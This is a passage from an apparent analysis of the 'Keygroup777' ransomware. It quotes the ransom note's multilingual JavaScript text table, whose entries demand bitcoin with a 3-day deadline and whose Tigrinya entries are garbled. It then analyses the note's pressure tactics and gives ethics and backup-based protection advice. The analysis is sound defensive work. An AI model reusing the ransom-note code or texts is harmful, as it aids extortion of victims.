      guarantee: "Конечно. Мы гарантируем, что вы сможете безопасно и легко восстановить все свои файлы. Но у вас не так много времени.",
      freeDecrypt: "Вы можете расшифровать некоторые свои файлы бесплатно. Попробуйте нажать 'Decrypt'.",
      paymentNeed: "Но если вы хотите расшифровать все свои файлы, вам нужно заплатить.",
      timeLimit: "У вас есть только 3 дня, чтобы отправить платеж...",
      howToPay: "Как мне оплатить?",
      paymentMethod: "Оплата принимается только в биткоинах...",
    },
    be: {
      title: "Ой, вашы файлы зашыфраваны!",
      whatHappened: "Што здарылася з маім камп'ютэрам?",
      filesEncrypted: "Вашы важныя файлы зашыфраваны.",
      details: "Многія з вашых дакументаў, фотаздымкаў, відэа, баз даных і іншых файлаў больш недаступныя...",
      recoverFiles: "Ці магу я аднавіць файлы?",
      guarantee: "Канешне. Мы гарантуем, что вы зможаце бяспечна і лёгка аднавіць усе свае файлы. Але ў вас не так шмат часу.",
      freeDecrypt: "Вы можаце расшыфраваць некаторыя з сваіх файлаў бясплатна. Спробуйце націснуць 'Decrypt'.",
      paymentNeed: "Але калі вы хочаце расшыфраваць усе свае файлы, вам трэба заплаціць.",
      timeLimit: "У вас ёсць толькі 3 дні, каб даслаць плацеж...",
      howToPay: "Як мне заплаціць?",
      paymentMethod: "Аплата прымаецца толькі ў біткойнах...",
    },
    zh: {
      title: "哎呀，您的文件已经被加密！",
      whatHappened: "我的电脑发生了什么？",
      filesEncrypted: "您的重要文件已被加密。",
      details: "您的许多文档、照片、视频、数据库和其他文件都无法访问......",
      recoverFiles: "我可以恢复文件吗？",
      guarantee: "当然。我们保证您可以安全轻松地恢复所有文件。但是，您没有多少时间。",
      freeDecrypt: "您可以免费解密某些文件。尝试点击“Decrypt”。",
      paymentNeed: "但如果您想解密所有文件，您需要支付。",
      timeLimit: "您只有3天的时间进行付款......",
      howToPay: "我该如何支付？",
      paymentMethod: "仅接受比特币付款......",
    },
    es: {
      title: "¡Oops, sus archivos han sido cifrados!",
      whatHappened: "¿Qué ocurrió con mi computadora?",
      filesEncrypted: "Sus archivos importantes están cifrados.",
      details: "Muchos de sus documentos, fotos, videos, bases de datos y otros archivos ya no están disponibles...",
      recoverFiles: "¿Se pueden recuperar los archivos?",
      guarantee: "Por supuesto. Garantizamos que podrá recuperar todos sus archivos de forma segura y fácil. Pero no tiene mucho tiempo。",
      freeDecrypt: "Puede descifrar algunos de sus archivos de forma gratuita. Intente presionar 'Decrypt'.",
      paymentNeed: "Pero si desea descifrar todos sus archivos, necesitará pagar。",
      timeLimit: "Solo tiene 3 días para enviar el pago...",
      howToPay: "¿Cómo puedo pagar?",
      paymentMethod: "El pago se acepta solo en bitcoins...",
    },
    ku: {
      title: "Baxî, pelan we hatine şifrkirin!",
      whatHappened: "Çi bûye bi kompiyutera min?",
      filesEncrypted: "Pelên girîng yên we şifrkiriyane.",
      details: "Ziyaretiyên belgeyên we, wêne, vîdyo, danegehan û pelên din ne qedîne... ",
      recoverFiles: "Ma dikarin pelan bigrin?",
      guarantee: "Bila. Em piştrast dikin ku hûn dikarin hemû pelên xwe bi ewle û hêsan bigirin. Lê tu pir zor ne bidê.",
      freeDecrypt: "Hûn dikarin hinek pelên xwe bi belaş şifre çözüne. Tiştek poçik bikin 'Decrypt'.",
      paymentNeed: "Lê ger hûn dixwazin hemû pelên xwe şifre çözün, hûn pêdivî ye ku bişînin.",
      timeLimit: "Hûn tenê 3 rojan hene da ku bîmre!",
      howToPay: "Çawa ez para bidim?",
      paymentMethod: "Tenê bi bitcoin tê qebûl kirin...",
    },
    my: {
      title: "Oops, fail anda telah dienkripsi!",
      whatHappened: "Apa yang berlaku kepada komputer saya?",
      filesEncrypted: "Fail penting anda telah dienkripsi.",
      details: "Banyak dokumen, foto, video, pangkalan data, dan fail lain anda tidak lagi boleh diakses...",
      recoverFiles: "Bolehkah saya memulihkan fail?",
      guarantee: "Sudah tentu. Kami menjamin bahawa anda dapat memulihkan semua fail anda dengan selamat dan mudah. Tetapi anda tidak mempunyai banyak masa.",
      freeDecrypt: "Anda boleh menyahkripsi beberapa fail anda secara percuma. Cuba klik 'Decrypt'.",
      paymentNeed: "Tetapi jika anda mahu menyahkripsi semua fail anda, anda perlu membayar.",
      timeLimit: "Anda hanya mempunyai 3 hari untuk menghantar bayaran...",
      howToPay: "Bagaimana saya perlu membayar?",
      paymentMethod: "Pembayaran hanya diterima dalam bitcoin...",
    },
    sy: {
      title: "أوبس، لقد تم تشفير ملفاتك!",
      whatHappened: "ماذا حدث لجهاز الكمبيوتر الخاص بي؟",
      filesEncrypted: "تم تشفير ملفاتك المهمة。",
      details: "العديد من مستنداتك وصورك ومقاطع الفيديو وقواعد البيانات والملفات الأخرى لم تعد متاحة...",
      recoverFiles: "هل يمكنني استعادة الملفات؟",
      guarantee: "بالطبع. نحن نضمن أنك ستتمكن من استعادة جميع ملفاتك بأمان وسهولة. لكن ليس لديك الكثير من الوقت。",
      freeDecrypt: "يمكنك فك تشفير بعض ملفاتك مجانًا. حاول الضغط على 'Decrypt'.",
      paymentNeed: "لكن إذا كنت تريد فك تشفير جميع ملفاتك، فسيتعين عليك الدفع。",
      timeLimit: "لديك 3 أيام فقط لإرسال الدفع...",
      howToPay: "كيف أدفع؟",
      paymentMethod: "يتم قبول الدفع فقط بالبيتكوين...",
    },
    er: {
      title: "እየአዛንክይ ኣመይር፣ ፋይልዎች ቀውም",
      whatHappened: "እዚ ፀሐፍ ዲስኑ ወኣእጣጋክየ",
      filesEncrypted: "ጊዜሉን ትኽዕልነ ወፋይሎች ተራቢኢ ይዌዐሉ",
      details: "ዝይኮይ፡ በይ ዝኽይምየት ገምኒ፣ ሣንሕተን፣ ዳቦት ደቃይየ ሻትዉ>",
      recoverFiles: "እንኩየዚ ዊኩር ይዋስዉ ኖలል?",
      guarantee: "ወኣሰኴነ ዚ አረየዌ ምባምኩ ያለን ዘሓምሶ:",
      freeDecrypt: "ጉዚዘ ኣዘንጭቱዋ ባቀዋክ ዋህዌውነ ይዋስዉ ው 'ምትተክ' ኒ",
      paymentNeed: "ጠንኒዚ ከዜናዊ ተድጉብዢ ",
      timeLimit: "ጵዒ መድእም ከዕዟቀነ ናት ዉላ",
      howToPay: "ዝይምቱሃን አውበጥ",
      paymentMethod: "ንግዕቲቕ ኈንግሪይዊ ይፅይሉ እይሳነ",
    },
    ni: {
      title: "Oops, ¡sus archivos han sido cifrados!",
      whatHappened: "¿Qué pasó con mi computadora?",
      filesEncrypted: "Sus archivos importantes han sido cifrados.",
      details: "Muchos de sus documentos, fotos, videos, bases de datos y otros archivos ya no están disponibles...",
      recoverFiles: "¿Puedo recuperar los archivos?",
      guarantee: "Por supuesto. Garantizamos que podrá restaurar todos sus archivos de forma segura y fácil. Pero no tiene mucho tiempo。",
      freeDecrypt: "Puede descifrar algunos de sus archivos de forma gratuita. Intente presionar 'Decrypt'.",
      paymentNeed: "Pero si desea descifrar todos sus archivos, deberá pagar。",
      timeLimit: "Solo tiene 3 días para enviar el pago...",
      howToPay: "¿Cómo debo pagar?",
      paymentMethod: "El pago solo se acepta en bitcoin...",
    },
    ve: {
      title: "¡Oops, sus archivos han sido cifrados!",
      whatHappened: "¿Qué pasó con mi computadora?",
      filesEncrypted: "Sus archivos importantes están cifrados。",
      details: "Muchos de sus documentos, fotos, videos, bases de datos y otros archivos ya no están disponibles...",
      recoverFiles: "¿Se pueden recuperar los archivos?",
      guarantee: "Por supuesto. Garantizamos que podrá recuperar todos sus archivos de forma segura y fácil. Pero no tiene mucho tiempo。",
      freeDecrypt: "Puede descifrar algunos de sus archivos gratis. Intente presionar 'Decrypt'.",
      paymentNeed: "Pero si desea descifrar todos sus archivos, necesitará pagar。",
      timeLimit: "Solo tiene 3 días para enviar el pago...",
      howToPay: "¿Cómo puedo pagar?",
      paymentMethod: "El pago se acepta solo en bitcoins...",
    }
  };

  const selectedTexts = texts[lang];
  for (const key in selectedTexts) {
    document.getElementById(key).textContent = selectedTexts[key];
  }
}
</script>
</body>
</html>
```

#### Analysis
- **Visual Design**: The HTML page uses a red and black color scheme to create a sense of urgency and danger, with a centered card layout for readability.
- **Interactivity**: Includes buttons for copying the Bitcoin address, learning about Bitcoin, and initiating decryption (via an external link).
- **Psychological Pressure**: The 3-hour countdown timer and phrases like "You have only 3 days" pressure the victim into quick action.
- **Multilingual Strategy**: Supports languages like Russian, Chinese, and Arabic, indicating a global target audience.
- **Deceptive Promises**: Claims a "free decrypt" option and guarantees file recovery, which is likely misleading given the lack of a decryption mechanism in the code.

#### Comparison of Notes
- **Format**: `info.txt` is a simple text file, while `info.html` is a sophisticated webpage with interactivity and styling.
- **Content**: Both demand $300 in Bitcoin and provide the same Bitcoin address, but `info.html` adds a timer and multilingual support.
- **Purpose**: `info.txt` is a fallback, while `info.html` is the primary interface, likely intended to be opened automatically.
- **Effectiveness**: The HTML note is more intimidating due to its visual design and countdown timer, increasing the likelihood of compliance.

---

## 🚨 6. Ethical and Legal Considerations

This ransomware is malicious and illegal. Key points:
- **Harm**: Causes financial and emotional distress by locking critical files.
- **Legality**: Distributing ransomware violates laws globally, with severe penalties.
- **Education**: Analyzing such code helps develop cybersecurity defenses.

---

## 🛡️ 7. How to Protect Against Ransomware

Based on the code’s behavior:
1. **Backups**: Store offline or secure cloud backups.
2. **Updates**: Keep software patched.
3. **Antivirus**: Use reputable antivirus tools.
4. **Education**: Avoid suspicious links or downloads.
5. **Permissions**: Limit user access to critical directories.
6. **Shadow Copies**: Protect and enable Volume Shadow Copies.

---

## 🔚 Conclusion

The Keygroup777 ransomware code is a stark reminder of the destructive potential of malware. By creating ransom notes, encrypting files, and disabling recovery options, it aims to coerce victims into paying for decryption. However, its incomplete key management suggests it may be a prototype or require additional infrastructure. Understanding such code helps cybersecurity professionals build better defenses and educates users on protecting their systems. Stay vigilant, back up your data, and prioritize security to stay safe from such threats! 🛡️